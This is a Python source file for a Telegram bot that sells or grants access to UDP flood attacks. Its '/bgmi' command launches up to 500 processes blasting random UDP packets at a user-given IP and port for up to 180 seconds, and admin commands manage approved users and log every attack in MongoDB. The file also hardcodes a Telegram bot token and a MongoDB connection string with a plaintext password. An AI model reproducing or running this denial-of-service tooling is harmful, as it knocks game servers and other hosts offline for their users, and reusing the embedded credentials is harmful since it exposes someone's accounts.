import os
import random
import socket
import logging
import multiprocessing
import datetime
from threading import Event
from pymongo import MongoClient
import telebot

# Telegram bot setup
BOT_TOKEN = "7828525928:AAH_BvvdQFpSObummrtZXXV3WeDAXmnXT5A"
ADMIN_ID = "7163028849"
bot = telebot.TeleBot(BOT_TOKEN)

# MongoDB setup
MONGO_URI = "mongodb+srv://titanop24:titanop24@cluster0.qbdl8.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"  
client = MongoClient(MONGO_URI)
db = client["telegram_bot"]
users_collection = db["users"]
attacks_collection = db["attacks"]
logs_collection = db["logs"]

# Track active attack
global_active_attack = Event()

# 🛠️ Function to send UDP packets
def udp_flood(target_ip, target_port, stop_flag):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # Allow socket address reuse
    while not stop_flag.is_set():
        try:
            packet_size = random.randint(64, 1469)  # Random packet size
            data = os.urandom(packet_size)  # Generate random data
            for _ in range(200000):  # Maximize impact by sending multiple packets
                sock.sendto(data, (target_ip, target_port))
        except Exception as e:
            logging.error(f"Error sending packets: {e}")
            break  # Exit loop on any socket error

# 🚀 Function to start a UDP flood attack
def start_udp_flood(user_id, target_ip, target_port, attack_time):
    if global_active_attack.is_set():
        bot.send_message(user_id, "❌ Another attack is already running. Please wait until it finishes.")
        return

    stop_flag = multiprocessing.Event()
    global_active_attack.set()

    processes = []
    for _ in range(min(500, multiprocessing.cpu_count())):
        process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag))
        process.start()
        processes.append(process)

    # Record attack in MongoDB
    attack_entry = {
        "user_id": user_id,
        "ip": target_ip,
        "port": target_port,
        "start_time": datetime.datetime.now(),
        "duration": attack_time
    }
    attacks_collection.insert_one(attack_entry)

    bot.send_message(user_id, f"☢️ Attack started on {target_ip}:{target_port} for {attack_time} seconds.")

    # Wait for the attack duration and stop all processes
    stop_flag.wait(attack_time)
    stop_flag.set()

    for process in processes:
        process.join()

    global_active_attack.clear()
    bot.send_message(user_id, "✅ Attack finished.")

# Approve User
def approve_user(user_id, days):
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=days)
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"approved": True, "expiry_date": expiry_date}},
        upsert=True
    )
    bot.send_message(ADMIN_ID, f"✅ User {user_id} approved for {days} days.")

# Disapprove User
def disapprove_user(user_id):
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"approved": False, "expiry_date": None}}
    )
    bot.send_message(ADMIN_ID, f"❌ User {user_id} disapproved.")

# Command Handlers
@bot.message_handler(commands=['approve'])
def handle_approve(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    try:
        _, user_id, days = message.text.split()
        approve_user(int(user_id), int(days))
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error: {e}")

@bot.message_handler(commands=['disapprove'])
def handle_disapprove(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    try:
        _, user_id = message.text.split()
        disapprove_user(int(user_id))
    except Exception as e:
        bot.send_message(ADMIN_ID, f"Error: {e}")

@bot.message_handler(commands=['users'])
def handle_users(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    users = users_collection.find()
    response = "👥 Approved Users:\n"
    for user in users:
        status = "Approved" if user.get("approved") else "Disapproved"
        expiry = user.get("expiry_date", "N/A")
        response += f"ID: {user['user_id']} - Status: {status}, Expiry: {expiry}\n"
    bot.send_message(ADMIN_ID, response)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = message.chat.id
    user = users_collection.find_one({"user_id": user_id})

    if not user or not user.get("approved"):
        bot.send_message(user_id, "❌ You are not approved to use this command.")
        return

    try:
        _, target_ip, target_port, attack_time = message.text.split()
        target_port = int(target_port)
        attack_time = int(attack_time)

        if attack_time > 180:
            bot.send_message(user_id, "❌ Maximum attack duration is 180 seconds.")
            return

        start_udp_flood(user_id, target_ip, target_port, attack_time)

    except Exception as e:
        bot.send_message(user_id, f"Error: {e}")

@bot.message_handler(commands=['attacks'])
def handle_attacks(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    attacks = attacks_collection.find()
    response = "📊 Attack Logs:\n"
    for attack in attacks:
        response += f"User: {attack['user_id']}, Target: {attack['ip']}:{attack['port']}, Duration: {attack['duration']}, Start: {attack['start_time']}\n"
    bot.send_message(ADMIN_ID, response)

@bot.message_handler(commands=['logs'])
def handle_logs(message):
    if str(message.chat.id) != ADMIN_ID:
        return
    logs = logs_collection.find()
    response = "📜 Logs:\n"
    for log in logs:
        response += f"{log}\n"
    bot.send_message(ADMIN_ID, response)

# Start the bot
if __name__ == "__main__":
    bot.polling(non_stop=True)
